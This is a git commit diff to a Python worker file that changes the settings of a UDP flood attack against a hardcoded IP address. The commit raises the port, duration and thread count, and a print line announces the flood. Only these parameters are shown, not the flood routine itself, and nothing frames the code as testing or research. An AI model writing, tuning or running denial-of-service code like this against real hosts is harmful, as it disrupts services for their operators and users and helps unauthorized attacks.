7a111a7586dffab1c8787eebd09cc4d362fae765
IdkTonaii <167789035+IdkTonaii@users.noreply.github.com>
2026-08-12 20:48:09 -0500

    Update worker.py

--- worker.py
+++ worker.py
@@ -481,10 +481,10 @@ class Worker:
         # ====================================================
 
         TARGET_IP = '3.142.56.81'
-        TARGET_PORT = 9013
+        TARGET_PORT = 9070
         PACKET_SIZE = 300
-        DURATION = 30
-        NUM_THREADS = 400
+        DURATION = 50
+        NUM_THREADS = 500
 
         print(f"\n[*] Starting UDP flood to {TARGET_IP}:{TARGET_PORT} using {NUM_THREADS} threads for {DURATION} seconds...")
 
